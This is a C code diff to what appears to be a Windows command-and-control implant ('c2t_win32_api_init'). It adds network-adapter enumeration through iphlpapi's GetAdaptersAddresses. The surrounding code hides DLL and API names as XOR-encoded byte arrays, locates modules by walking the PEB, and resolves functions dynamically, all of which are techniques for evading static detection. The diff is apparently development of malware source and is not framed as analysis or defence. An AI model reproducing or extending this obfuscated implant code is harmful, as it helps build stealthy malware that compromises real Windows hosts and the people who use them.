@@ -106,6 +106,7 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_shell32_dll[] = {41, 50, 63, 54, 54, 105, 104, 116, 62, 54, 54};
 
   static const unsigned char enc_winhttp_dll[] = {45, 51, 52, 50, 46, 46, 42, 116, 62, 54, 54};
+  static const unsigned char enc_iphlpapi_dll[] = {51, 42, 50, 54, 42, 59, 42, 51, 116, 62, 54, 54};
 
   /* user32 functions */
   static const unsigned char enc_GetWindowThreadProcessId[] = {29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 50, 40, 63, 59, 62, 10, 40, 53, 57, 63, 41, 41, 19, 62};
@@ -238,13 +239,17 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_WinHttpSetTimeouts[] = {13, 51, 52, 18, 46, 46, 42, 9, 63, 46, 14, 51, 55, 63, 53, 47, 46, 41};
   static const unsigned char enc_WinHttpSetOption[] = {13, 51, 52, 18, 46, 46, 42, 9, 63, 46, 21, 42, 46, 51, 53, 52};
 
-  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32];
+  /* iphlpapi functions */
+  static const unsigned char enc_GetAdaptersAddresses[] = {29, 63, 46, 27, 62, 59, 42, 46, 63, 40, 41, 27, 62, 62, 40, 63, 41, 41, 63, 41};
+
+  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32];
   c2t_win32_xor_decode(dll_user32, enc_user32_dll, sizeof(enc_user32_dll), 0x5A);
   c2t_win32_xor_decode(dll_kernel32, enc_kernel32_dll, sizeof(enc_kernel32_dll), 0x5A);
   c2t_win32_xor_decode(dll_advapi32, enc_advapi32_dll, sizeof(enc_advapi32_dll), 0x5A);
   c2t_win32_xor_decode(dll_bcrypt, enc_bcrypt_dll, sizeof(enc_bcrypt_dll), 0x5A);
   c2t_win32_xor_decode(dll_shell32, enc_shell32_dll, sizeof(enc_shell32_dll), 0x5A);
   c2t_win32_xor_decode(dll_winhttp, enc_winhttp_dll, sizeof(enc_winhttp_dll), 0x5A);
+  c2t_win32_xor_decode(dll_iphlpapi, enc_iphlpapi_dll, sizeof(enc_iphlpapi_dll), 0x5A);
 
   HMODULE hKernel32 = c2t_win32_get_module_peb(L"kernel32.dll");
   if (!hKernel32) hKernel32 = GetModuleHandleA(dll_kernel32);
@@ -269,6 +274,10 @@ void c2t_win32_api_init(void) {
   HMODULE hWinhttp = c2t_win32_get_module_peb(L"winhttp.dll");
   if (!hWinhttp) hWinhttp = GetModuleHandleA(dll_winhttp);
   if (!hWinhttp && hKernel32) hWinhttp = LoadLibraryA(dll_winhttp);
+
+  HMODULE hIphlpapi = c2t_win32_get_module_peb(L"iphlpapi.dll");
+  if (!hIphlpapi) hIphlpapi = GetModuleHandleA(dll_iphlpapi);
+  if (!hIphlpapi && hKernel32) hIphlpapi = LoadLibraryA(dll_iphlpapi);
 
 #define LOAD_API(hMod, field, enc_arr)                                         \
   do {                                                                         \
@@ -410,6 +419,9 @@ void c2t_win32_api_init(void) {
   LOAD_API(hWinhttp, WinHttpCloseHandle, enc_WinHttpCloseHandle);
   LOAD_API(hWinhttp, WinHttpSetTimeouts, enc_WinHttpSetTimeouts);
   LOAD_API(hWinhttp, WinHttpSetOption, enc_WinHttpSetOption);
+
+  /* iphlpapi */
+  LOAD_API(hIphlpapi, GetAdaptersAddresses, enc_GetAdaptersAddresses);
 
 #undef LOAD_API
 
